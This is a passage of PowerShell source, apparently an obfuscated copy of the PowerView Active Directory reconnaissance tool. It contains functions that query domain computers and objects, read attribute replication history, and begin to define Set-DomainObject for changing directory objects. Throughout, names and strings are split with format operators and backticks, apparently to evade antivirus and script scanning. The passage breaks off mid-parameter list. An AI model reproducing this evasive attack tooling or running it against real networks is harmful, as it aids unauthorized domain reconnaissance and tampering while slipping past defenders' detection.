            if (  $PSBoundParameters[(  "{1}{3}{0}{2}" -f 'ic','S','ePack','erv' )] ) {
                Write-Verbose ('[Get-' + 'Do'+ 'mainComp' +  'uter] '  +'S'+  'earchi' +'n'  + 'g '+  'f'+ 'or ' +'c' +'om' + 'put' +'ers '  +'wi' +'th '+'s' +'e'+'rvice '+ 'pa'  +'ck: ' +  "$ServicePack")
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ( $PSBoundParameters[(  "{1}{0}{2}" -f 'eNam','Sit','e'  )] ) {
                Write-Verbose (  '['  + 'Get' + '-Dom'  +  'ainCom' +'puter] '  +  'Sea' + 'rc'  +'hing '  +'for' +  ' '  +'com' + 'puter' +  's ' +'w' +  'ith ' +  'sit'  +  'e '  + 'n' + 'ame'  +': ' + "$SiteName")
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if (  $PSBoundParameters[(  "{0}{1}{2}"-f 'LD','AP','Filter'  )] ) {
                Write-Verbose (  '[Ge' + 't-'  +  'Do' +'main' +'Com' +  'puter] '  +  'Usin' + 'g '  +  'a' + 'dditio' +'nal '  + 'L'  + 'DAP '  + 'filt'  +  'er'  +  ': '  +"$LDAPFilter" )
                $Filter += "$LDAPFilter"
            }
            
            $UACFilter   | Where-Object {$_}   |  ForEach-Object {
                if (  $_ -match ( "{0}{1}" -f'NOT_','.*' )  ) {
                    $UACField   = $_.SubStRiNG( 4 )
                    $UACValue =  [Int]($UACEnum::$UACField  )
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter  = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if ($PSBoundParameters[(  "{0}{2}{1}" -f'Find','ne','O' )]) { $Results  = $CompSearcher.fIndONe( ) }
            else { $Results =  $CompSearcher.fIndALL(   ) }
            $Results  |   Where-Object {$_}   |  ForEach-Object {
                $Up   =  $True
                if ( $PSBoundParameters[("{0}{1}" -f'Pi','ng')]  ) {
                    $Up =  Test-Connection -Count 1 -Quiet -ComputerName $_.ProPErtiES.DnshOstnAme
                }
                if (  $Up) {
                    if (  $PSBoundParameters['Raw']) {
                        
                        $Computer  =  $_
                        $Computer.psOBjEcT.tYPeNamES.InsErT(0, ("{2}{0}{4}{3}{6}{1}{5}" -f'ow','.','P','p','erView.Com','Raw','uter'  ))
                    }
                    else {
                        $Computer  = Convert-LDAPProperty -Properties $_.ProperTies
                        $Computer.PsObJEcT.TypeNaMEs.iNsERT( 0, (  "{3}{2}{0}{1}{4}" -f'View.Comp','ut','er','Pow','er' )  )
                    }
                    $Computer
                }
            }
            if (  $Results) {
                try { $Results.diSpOsE(  ) }
                catch {
                    Write-Verbose ( '[Ge' +'t' +  '-D' +'omainComp'+'uter' +'] ' + 'Er' + 'ror ' +  'di'+'sposi' +'ng '+'o'+'f '+'t'+ 'he '+ 'Results'  + ' '  +'obj'  +'ect'  +  ': '  +  "$_"  )
                }
            }
            $CompSearcher.DiSpOSe()
        }
    }
}


function Get-`D`oMA`inOb`jEct {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{3}{0}{7}{8}{5}{4}{6}{1}{2}"-f 'S','re','ThanAssignments','P','edVar','r','sMo','UseD','ecla'}, '')]
    [OutputType({"{1}{3}{0}{4}{2}" -f'erV','Po','w.ADObject','w','ie'}  )]
    [OutputType({"{0}{2}{3}{4}{5}{6}{1}" -f 'Pow','Raw','erView.A','D','O','bje','ct.'}  )]
    [CmdletBinding(   )]
    Param(  
        [Parameter(poSition   =   0, valUEfRompiPelIne =   $True, vALUefrOMpiPeLiNEbyprOpERTYnAMe = $True )]
        [Alias(  {"{1}{4}{3}{2}{0}" -f 'me','Dist','a','shedN','ingui'}, {"{0}{3}{1}{4}{2}" -f 'S','mAccou','ame','a','ntN'}, {"{1}{0}" -f'ame','N'}, {"{1}{0}{3}{4}{2}"-f'mbe','Me','shedName','rDisting','ui'}, {"{2}{0}{1}" -f'ber','Name','Mem'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty( )]
        [Alias( {"{0}{1}" -f 'Filte','r'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{1}{0}" -f 'h','ADSPat'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{1}{3}{0}{2}" -f'roll','DomainCon','er','t'} )]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}" -f'B','ase'}, {"{2}{1}{0}" -f 'vel','neLe','O'}, {"{1}{0}"-f'e','Subtre'})]
        [String]
        $SearchScope =  ("{1}{0}{2}"-f 'ub','S','tree'  ),

        [ValidateRange( 1, 10000 )]
        [Int]
        $ResultPageSize   =   200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{0}{1}"-f'Dac','l'}, {"{0}{1}"-f'Gro','up'}, {"{0}{1}" -f'Non','e'}, {"{0}{1}"-f'O','wner'}, {"{1}{0}" -f'l','Sac'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias( {"{0}{1}{2}" -f'Return','O','ne'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::EMpTy,

        [Switch]
        $Raw
     )

    DynamicParam {
        $UACValueNames   =   [Enum]::GETNAmEs(  $UACEnum  )
        
        $UACValueNames   = $UACValueNames | ForEach-Object {$_ ; "NOT_$_"}
        
        New-DynamicParameter -Name ('U'+ 'ACFil' +  'ter') -ValidateSet $UACValueNames -Type ( [array] )
    }

    BEGIN {
        $SearcherArguments   = @{}
        if ($PSBoundParameters[("{0}{1}"-f 'Doma','in'  )]) { $SearcherArguments[( "{1}{0}" -f'omain','D')]   = $Domain }
        if ( $PSBoundParameters[( "{0}{1}{2}{3}"-f 'P','rope','rtie','s'  )] ) { $SearcherArguments[(  "{1}{2}{0}" -f's','Propert','ie' )]  =  $Properties }
        if ( $PSBoundParameters[( "{0}{1}{2}" -f 'Sea','rc','hBase'  )] ) { $SearcherArguments[( "{0}{1}{2}"-f 'Se','archBas','e' )]   =  $SearchBase }
        if (  $PSBoundParameters[("{1}{0}"-f 'ver','Ser' )]  ) { $SearcherArguments[(  "{0}{1}"-f'Serv','er')]  =  $Server }
        if (  $PSBoundParameters[("{1}{2}{3}{0}" -f 'pe','S','ear','chSco'  )] ) { $SearcherArguments[( "{3}{2}{1}{0}" -f 'chScope','r','ea','S' )]  =   $SearchScope }
        if ( $PSBoundParameters[( "{4}{2}{3}{1}{0}"-f'e','iz','ltP','ageS','Resu'  )]) { $SearcherArguments[("{3}{2}{0}{1}"-f'ultPage','Size','es','R')]  =   $ResultPageSize }
        if ($PSBoundParameters[(  "{3}{0}{1}{2}" -f'erve','rTim','eLimit','S' )]) { $SearcherArguments[( "{2}{1}{3}{4}{0}"-f 't','r','Serve','T','imeLimi' )] =  $ServerTimeLimit }
        if ( $PSBoundParameters[("{1}{0}{2}{3}" -f 'urityM','Sec','ask','s')]) { $SearcherArguments[(  "{0}{1}{2}{3}" -f'Secu','rit','yMa','sks'  )]  = $SecurityMasks }
        if ( $PSBoundParameters[( "{1}{2}{0}"-f'tone','Tomb','s'  )]  ) { $SearcherArguments[( "{0}{2}{1}" -f 'Tomb','one','st'  )] =   $Tombstone }
        if (  $PSBoundParameters[( "{2}{0}{1}" -f'e','dential','Cr' )]) { $SearcherArguments[("{3}{0}{1}{2}" -f 'ede','nt','ial','Cr'  )]   =  $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ( $PSBoundParameters.cOunT -ne 0)  ) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher ) {
            $IdentityFilter   =   ''
            $Filter  =   ''
            $Identity |   Where-Object {$_}  |   ForEach-Object {
                $IdentityInstance =  $_.REPLACE(  '(', '\28' ).REplAcE(')', '\29')
                if ($IdentityInstance -match ("{1}{0}" -f'1-','^S-' )) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ( $IdentityInstance -match ((  ( "{2}{0}{3}{1}"-f '}O','{0}DC)=','^(CN{0','U')  )  -f  [cHAR]124  )  ) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if (  ( -not $PSBoundParameters[(  "{2}{1}{0}" -f 'in','a','Dom'  )]) -and ( -not $PSBoundParameters[(  "{0}{1}{3}{2}" -f'Search','Ba','e','s')]  )) {
                        
                        
                        $IdentityDomain   = $IdentityInstance.sUBstriNg($IdentityInstance.inDeXoF( 'DC=' )  ) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[Get'  +  '-' + 'DomainObj' +'e'+  'c'  + 't] '+'E'+'xtracted'+' ' +'domain'  + ' ' + "'$IdentityDomain' " + 'from' +  ' '+ "'$IdentityInstance'"  )
                        $SearcherArguments[("{1}{0}"-f'main','Do')]  =  $IdentityDomain
                        $ObjectSearcher  = Get-DomainSearcher @SearcherArguments
                        if ( -not $ObjectSearcher ) {
                            Write-Warning ( '[Get-'+'DomainOb'+  'je'+'ct]'  +  ' '+  'Unable'+ ' ' + 't'+ 'o '  +'r' +  'etriev' +'e '+'doma'  + 'in '  +'searc' +  'her ' +  'fo'  +'r ' + "'$IdentityDomain'"  )
                        }
                    }
                }
                elseif ( $IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$'  ) {
                    $GuidByteString  = (  ([Guid]$IdentityInstance ).TobYTearrAY( ) |  ForEach-Object { '\' +  $_.toStrINg(  'X2' ) }  ) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.cOnTains('\'  ) ) {
                    $ConvertedIdentityInstance  = $IdentityInstance.rePlaCe('\28', '(').RePLAcE( '\29', ')')   | Convert-ADName -OutputType ('Ca' +  'nonica'  +'l'  )
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain  = $ConvertedIdentityInstance.sUBStRIng(0, $ConvertedIdentityInstance.InDExOf( '/')  )
                        $ObjectName  =   $IdentityInstance.SPlIT( '\' )[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments[(  "{1}{0}"-f 'ain','Dom'  )]  =  $ObjectDomain
                        Write-Verbose ('[Get-Dom'  +  'ainOb'  +  'je'+  'ct] ' + 'E'+  'xtra'+'c' + 'ted '+  'do'  +'ma'+ 'in ' +"'$ObjectDomain' "+'from'  +' ' + "'$IdentityInstance'"  )
                        $ObjectSearcher   =  Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.conTaiNs( '.') ) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (  $IdentityFilter -and (  $IdentityFilter.triM(   ) -ne '' )  ) {
                $Filter += "(|$IdentityFilter)"
            }

            if (  $PSBoundParameters[(  "{0}{3}{1}{2}"-f'L','Filt','er','DAP' )] ) {
                Write-Verbose ( '['+'Get'+  '-' + 'Domain' + 'Ob' + 'ject] ' + 'Us'  +'ing '  + 'a'  + 'dditi'  +  'onal '  +'LDA'+  'P ' + 'filte'+'r: '  +  "$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            
            $UACFilter   | Where-Object {$_} | ForEach-Object {
                if (  $_ -match ("{0}{1}" -f 'NOT','_.*' )) {
                    $UACField   = $_.SubstriNG( 4)
                    $UACValue =   [Int]($UACEnum::$UACField  )
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue =   [Int]( $UACEnum::$_ )
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if (  $Filter -and $Filter -ne ''  ) {
                $ObjectSearcher.fIlTeR  =  "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if (  $PSBoundParameters[( "{2}{0}{1}"-f 'dOn','e','Fin'  )] ) { $Results =  $ObjectSearcher.findonE(  ) }
            else { $Results  =  $ObjectSearcher.fINDaLl( ) }
            $Results  | Where-Object {$_} | ForEach-Object {
                if (  $PSBoundParameters['Raw']) {
                    
                    $Object   = $_
                    $Object.PSoBject.TYPEnameS.iNSErt(0, ( "{6}{2}{4}{5}{3}{1}{0}" -f'w','ct.Ra','er','Obje','View','.AD','Pow'))
                }
                else {
                    $Object   =  Convert-LDAPProperty -Properties $_.PROpERties
                    $Object.pSOBject.tYPENames.INSeRt( 0, ("{3}{0}{1}{2}{4}"-f'i','ew.','ADObj','PowerV','ect') )
                }
                $Object
            }
            if (  $Results  ) {
                try { $Results.dISpoSE(  ) }
                catch {
                    Write-Verbose (  '[Get-D'+  'o'  +'m'+'ainObjec' +'t' +'] '+ 'Error' +' '  +  'd'+ 'isposi'  + 'n'  +  'g '+'of' +  ' '+  'the' + ' '+'R'+'esult'+  's '+'objec' +  't' +  ': ' +  "$_" )
                }
            }
            $ObjectSearcher.DISpOSE(  )
        }
    }
}


function Get`-DomAi`NobjeC`T`AtT`R`IButehi`story {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{2}{1}{6}{8}{0}{3}{7}{5}{9}{4}"-f'Va','SUs','P','r','nments','T','eD','sMore','eclared','hanAssig'}, '')]
    [OutputType({"{9}{5}{8}{10}{4}{0}{7}{6}{1}{2}{3}" -f 'rib','eHi','stor','y','t','DOb','t','u','ject','PowerView.A','At'}  )]
    [CmdletBinding(  )]
    Param( 
        [Parameter( poSitioN =   0, vALUEfRompIPeLiNe =   $True, vaLueFroMPipElinEbYprOpeRtyName = $True )]
        [Alias({"{4}{0}{1}{3}{2}" -f's','t','nguishedName','i','Di'}, {"{3}{1}{2}{0}" -f 'e','Accou','ntNam','Sam'}, {"{0}{1}" -f 'Nam','e'}, {"{2}{1}{4}{3}{0}"-f'ame','ember','M','uishedN','Disting'}, {"{1}{0}{2}"-f 'erN','Memb','ame'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{1}{2}{0}"-f 'ter','F','il'} )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(  {"{1}{0}{2}" -f 'DSPa','A','th'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{5}{1}{0}{4}{3}{2}"-f 'nt','omainCo','er','ll','ro','D'}  )]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{2}{0}{1}" -f 'e','Level','On'}, {"{1}{0}" -f 'ubtree','S'})]
        [String]
        $SearchScope = ("{1}{0}" -f 'btree','Su'),

        [ValidateRange(1, 10000 )]
        [Int]
        $ResultPageSize   =   200,

        [ValidateRange(  1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential  = [Management.Automation.PSCredential]::eMpTy,

        [Switch]
        $Raw
     )

    BEGIN {
        $SearcherArguments  = @{
            ("{2}{3}{0}{1}" -f'ti','es','Pro','per')    =     ("{2}{5}{4}{3}{7}{6}{0}{1}" -f 'tada','ta','msd','att','epl','s-r','me','ribute'  ),("{3}{0}{2}{1}"-f'i','e','shednam','distingu')
            'Raw'             =    $True
        }
        if (  $PSBoundParameters[("{1}{0}"-f'omain','D')]  ) { $SearcherArguments[(  "{1}{0}"-f'n','Domai')] =   $Domain }
        if ( $PSBoundParameters[( "{0}{2}{1}" -f 'LDAPF','lter','i')] ) { $SearcherArguments[("{2}{1}{0}"-f 'r','DAPFilte','L'  )] = $LDAPFilter }
        if ( $PSBoundParameters[("{1}{2}{0}"-f'se','SearchB','a')]  ) { $SearcherArguments[("{2}{0}{1}" -f 'r','chBase','Sea'  )] =  $SearchBase }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'v','er','Ser'  )]) { $SearcherArguments[(  "{1}{0}{2}" -f 'rve','Se','r'  )] =   $Server }
        if ( $PSBoundParameters[( "{1}{2}{0}"-f 'chScope','S','ear'  )]  ) { $SearcherArguments[("{2}{1}{0}{3}"-f'Scop','ch','Sear','e' )]  =  $SearchScope }
        if ( $PSBoundParameters[("{2}{0}{1}" -f 'u','ltPageSize','Res' )]) { $SearcherArguments[(  "{1}{0}{3}{2}{4}" -f'sultP','Re','e','ag','Size'  )] = $ResultPageSize }
        if ($PSBoundParameters[(  "{1}{2}{3}{0}" -f 't','Se','r','verTimeLimi')] ) { $SearcherArguments[("{1}{2}{0}{3}"-f 'e','Serve','rTim','Limit'  )]  = $ServerTimeLimit }
        if ($PSBoundParameters[(  "{3}{1}{0}{2}"-f'bst','m','one','To')]) { $SearcherArguments[(  "{2}{1}{0}"-f'tone','mbs','To'  )] =   $Tombstone }
        if ( $PSBoundParameters[( "{1}{2}{0}" -f'One','F','ind'  )] ) { $SearcherArguments[(  "{0}{1}" -f'Fin','dOne')]   =   $FindOne }
        if ( $PSBoundParameters[(  "{2}{1}{0}"-f'l','dentia','Cre' )] ) { $SearcherArguments[( "{2}{0}{3}{1}" -f 'de','al','Cre','nti'  )]  =  $Credential }

        if ( $PSBoundParameters[(  "{0}{1}{2}"-f 'Pr','operti','es'  )]  ) {
            $PropertyFilter  =  $PSBoundParameters[(  "{0}{1}{2}" -f'P','r','operties')] -Join '|'
        }
        else {
            $PropertyFilter   =  ''
        }
    }

    PROCESS {
        if (  $PSBoundParameters[("{0}{1}"-f'Iden','tity'  )]) { $SearcherArguments[("{2}{0}{1}"-f'e','ntity','Id' )]   = $Identity }

        Get-DomainObject @SearcherArguments   | ForEach-Object {
            $ObjectDN  =  $_.PrOPErTies[( "{1}{0}{3}{2}"-f 'i','distingu','e','shednam' )][0]
            ForEach( $XMLNode in $_.PRoPErTIES[("{7}{1}{6}{0}{5}{2}{4}{3}"-f 'a','sds-rep','tri','emetadata','but','t','l','m' )] ) {
                $TempObject =   [xml]$XMLNode  |   Select-Object -ExpandProperty ("{0}{5}{4}{2}{1}{3}" -f'D','_D','META','ATA','EPL_ATTR_','S_R'  ) -ErrorAction ('Si'+ 'l'  + 'en'+'tlyConti'+ 'nue' )
                if (  $TempObject) {
                    if ($TempObject.PSzATTrIBuTeNAME -Match $PropertyFilter) {
                        $Output  = New-Object ('PSObj'  +  'ec'  +  't'  )
                        $Output   |  Add-Member ('Not'+ 'ePro'+'pe' +'rty') ("{1}{2}{0}" -f'tDN','O','bjec') $ObjectDN
                        $Output   |   Add-Member (  'NotePro'  + 'pe'  +'rty' ) ( "{2}{1}{3}{4}{0}"-f'eName','ttr','A','ibu','t') $TempObject.psZattriBUTENAmE
                        $Output |   Add-Member (  'Note' +'Pr'+  'oper'  +  'ty') ("{2}{3}{5}{1}{4}{0}" -f 'inatingChange','i','La','st','g','Or') $TempObject.fTiMElAstoriGInAtiNgchAnge
                        $Output  |  Add-Member (  'Note'  +'P' +  'roperty'  ) ( "{1}{0}{2}" -f'io','Vers','n') $TempObject.DWverSIoN
                        $Output  |  Add-Member ('N'  +  'otePro' + 'pe' +'rty'  ) ( "{2}{4}{0}{1}{3}" -f't','ing','LastOrig','DsaDN','ina'  ) $TempObject.pSZLAsTOriGInaTINgdSAdN
                        $Output.pSObjeCt.TYpEnAmES.INsErt(  0, ("{5}{10}{7}{6}{1}{0}{4}{8}{2}{3}{9}" -f 'i','ADObjectAttr','e','Histo','bu','Pow','w.','Vie','t','ry','er'))
                        $Output
                    }
                }
                else {
                    Write-Verbose ('[Ge'+'t-'+'Dom'  +  'ainObjec' +  't'+  'A' +  'tt'+ 'ributeHis' +  'to' +'ry] '  + 'Er'+  'ror '+ 'r'+ 'etri'  +'eving '  + ( 'W8B' +  'm'+  'sd' + 's'  +  '-rep' +'lattr'  +  'ibutem' + 'et'+ 'adataW8'+'B ').RepLacE(  'W8B',[sTRinG][cHAR]39  )+  'f' +'or ' +"'$ObjectDN'"  )
                }
            }
        }
    }
}


function Ge`T`-domAINO`B`jE`ctLInK`EDaTtrIb`Ut`E`h`ISTOrY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{1}{3}{2}{7}{0}{6}{10}{5}{9}{4}{8}" -f 'e','PS','a','UseDecl','e','n','dVarsMore','r','nts','Assignm','Tha'}, ''  )]
    [OutputType({"{2}{10}{5}{1}{8}{7}{3}{9}{0}{6}{4}" -f 'ri','e','Po','kedAt','uteHistory','i','b','ctLin','w.ADObje','t','werV'} )]
    [CmdletBinding()]
    Param( 
        [Parameter(PosiTioN = 0, ValUefromPIPElINe  =  $True, ValUefroMpipeliNebYPRoPErTynaME  = $True)]
        [Alias({"{3}{0}{2}{1}"-f 'istinguis','ame','hedN','D'}, {"{1}{3}{2}{0}" -f'Name','Sam','t','Accoun'}, {"{1}{0}"-f 'e','Nam'}, {"{2}{1}{5}{4}{6}{0}{3}" -f'a','n','MemberDisti','me','d','guishe','N'}, {"{3}{0}{2}{1}" -f'emb','ame','erN','M'}  )]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty( )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(    )]
        [Alias({"{1}{0}{2}"-f'e','Filt','r'}  )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias( {"{2}{1}{0}"-f'h','t','ADSPa'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{3}{1}{0}{2}{4}"-f'i','ma','nCont','Do','roller'}  )]
        [String]
        $Server,

        [ValidateSet( {"{1}{0}"-f 'se','Ba'}, {"{0}{1}" -f 'O','neLevel'}, {"{1}{0}"-f 'tree','Sub'}  )]
        [String]
        $SearchScope =  ( "{2}{1}{0}"-f'tree','b','Su'),

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize   = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential   =  [Management.Automation.PSCredential]::eMPty,

        [Switch]
        $Raw
     )

    BEGIN {
        $SearcherArguments  =   @{
            ( "{2}{1}{0}"-f'ties','oper','Pr' )    =    ("{0}{2}{1}{4}{3}"-f 'msds-repl','a','valuemet','a','dat'  ),("{1}{3}{2}{4}{0}" -f'me','distinguis','edn','h','a')
            'Raw'           =     $True
        }
        if (  $PSBoundParameters[(  "{0}{2}{1}" -f 'D','ain','om' )] ) { $SearcherArguments[(  "{0}{1}"-f'D','omain')] =   $Domain }
        if ($PSBoundParameters[( "{0}{3}{2}{1}"-f 'LDAPF','r','te','il' )] ) { $SearcherArguments[("{0}{1}{3}{2}" -f 'L','D','er','APFilt'  )]  =   $LDAPFilter }
        if (  $PSBoundParameters[( "{1}{2}{0}"-f 'hBase','Sear','c' )]  ) { $SearcherArguments[("{0}{2}{1}{3}" -f 'Sea','s','rchBa','e')]  =   $SearchBase }
        if ( $PSBoundParameters[(  "{1}{0}"-f 'erver','S' )] ) { $SearcherArguments[("{2}{0}{1}" -f'er','ver','S'  )]   =  $Server }
        if ( $PSBoundParameters[("{1}{2}{3}{0}"-f'Scope','Sea','r','ch')] ) { $SearcherArguments[( "{1}{0}{2}"-f 'rchScop','Sea','e' )] =  $SearchScope }
        if ($PSBoundParameters[(  "{1}{3}{0}{2}"-f'PageSi','Res','ze','ult')]  ) { $SearcherArguments[(  "{2}{3}{1}{0}"-f'ageSize','P','Res','ult')]   =   $ResultPageSize }
        if ( $PSBoundParameters[( "{3}{0}{2}{1}"-f'ver','mit','TimeLi','Ser'  )]  ) { $SearcherArguments[( "{2}{1}{4}{0}{3}"-f 'er','er','S','TimeLimit','v')] =   $ServerTimeLimit }
        if ( $PSBoundParameters[(  "{1}{2}{0}" -f 'one','Tomb','st')]  ) { $SearcherArguments[( "{3}{2}{0}{1}"-f 'o','ne','ombst','T'  )] =  $Tombstone }
        if ($PSBoundParameters[(  "{1}{2}{0}" -f 'l','Credent','ia')] ) { $SearcherArguments[( "{0}{2}{1}" -f 'Cr','tial','eden'  )]   =   $Credential }

        if ($PSBoundParameters[("{0}{1}{2}"-f'P','ropertie','s' )]  ) {
            $PropertyFilter  =  $PSBoundParameters[(  "{1}{0}{2}" -f 'rop','P','erties' )] -Join '|'
        }
        else {
            $PropertyFilter   =   ''
        }
    }

    PROCESS {
        if ( $PSBoundParameters[("{2}{0}{1}" -f'tit','y','Iden' )]  ) { $SearcherArguments[(  "{1}{0}{2}" -f 'd','I','entity'  )]  = $Identity }

        Get-DomainObject @SearcherArguments   | ForEach-Object {
            $ObjectDN  = $_.propeRTiES[(  "{4}{1}{0}{3}{2}{5}" -f'ing','t','he','uis','dis','dname')][0]
            ForEach( $XMLNode in $_.prOpeRtIEs[(  "{4}{0}{1}{5}{3}{6}{2}" -f'sds-r','e','ata','eta','m','plvaluem','d' )]  ) {
                $TempObject   = [xml]$XMLNode | Select-Object -ExpandProperty ( "{3}{7}{2}{0}{1}{4}{6}{5}" -f 'ET','A','REPL_VALUE_M','DS','_DA','A','T','_') -ErrorAction ( 'Si' + 'lentl'+ 'yConti'  + 'n'  + 'ue'  )
                if ( $TempObject  ) {
                    if ( $TempObject.PSzATTribUTENAme -Match $PropertyFilter ) {
                        $Output  = New-Object ('PSObje'  + 'c'  +  't' )
                        $Output   |   Add-Member ( 'No'+'tePrope' +  'r' + 'ty' ) ( "{0}{1}" -f'O','bjectDN') $ObjectDN
                        $Output  |  Add-Member (  'NotePr' + 'ope'+ 'rty'  ) ( "{0}{2}{3}{1}{4}" -f'At','e','tr','ibut','Name'  ) $TempObject.pSZattRIbuTenamE
                        $Output  |   Add-Member ('NoteP' + 'rop'  + 'e' + 'rty' ) ("{1}{0}{3}{2}"-f 'but','Attri','alue','eV'  ) $TempObject.pszobJEctdn
                        $Output | Add-Member ( 'No' +  'tePrope'  +'r'  + 'ty'  ) ("{2}{1}{0}" -f 'ated','re','TimeC' ) $TempObject.FTIMecREatED
                        $Output   |   Add-Member ('No'+  'teProp'+'erty' ) (  "{0}{1}{2}"-f'TimeDele','t','ed') $TempObject.FTimedeletEd
                        $Output  | Add-Member ( 'NoteP'+ 'rop'  + 'ert'+'y'  ) ( "{4}{0}{1}{2}{3}" -f 'g','C','ha','nge','LastOriginatin') $TempObject.FTimElasTorIginatinGchangE
                        $Output  |  Add-Member ('Not'+  'eP' +'rop' +'erty') (  "{0}{1}" -f 'Ver','sion') $TempObject.DwveRsiOn
                        $Output   |   Add-Member ('N' +  'oteProper' + 't'  + 'y'  ) (  "{2}{4}{0}{5}{3}{1}"-f 'na','saDN','LastOr','D','igi','ting' ) $TempObject.pSZLastoRIgiNAtiNgDsAdN
                        $Output.psobjEct.TYPENamEs.INSErT(  0, (  "{1}{3}{4}{7}{6}{5}{2}{0}{8}" -f 'ibuteHisto','Pow','ttr','erView','.A','A','inked','DObjectL','ry' ) )
                        $Output
                    }
                }
                else {
                    Write-Verbose (  '[Get-'+'Dom'+'ainObjec'+'tL'+  'inkedA'+ 't'  + 'tri' +'bute'+'History]' + ' '  +  'Err' + 'or ' +'r'  +  'etrievin'  + 'g' +  ' ' +(  'r'  + 'N9m'  +  'sds'  +  '-replv'+ 'aluemeta'+ 'datarN'  +'9 ' ).replACe(  'rN9',[sTrIng][chAr]39  ) +'f'+ 'or '  +  "'$ObjectDN'"  )
                }
            }
        }
    }
}


function Set-DOm`A`InobJ`eCT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{2}{1}{9}{8}{3}{4}{5}{7}{6}"-f 'PSUseShou','ocessForSt','ldPr','a','ng','ingFunct','ons','i','eCh','at'}, ''  )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{2}{0}{1}" -f'SShou','ldProcess','P'}, ''  )]
    [CmdletBinding( )]
    Param( 
        [Parameter(  positioN = 0, MANDAtOrY =  $True, ValUEFrompIpElinE   = $True, VALUEFROMPIPeLiNebyPROPeRtYnAmE =  $True  )]
        [Alias(  {"{5}{4}{1}{2}{0}{3}"-f 'h','ngu','is','edName','i','Dist'}, {"{1}{3}{0}{4}{2}"-f'ount','SamAc','me','c','Na'}, {"{0}{1}"-f'Na','me'}  )]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{1}{0}" -f'ace','Repl'})]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty(  )]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty( )]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{1}{2}{0}" -f 'r','F','ilte'}  )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty( )]
        [Alias({"{0}{1}{2}"-f 'ADS','P','ath'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
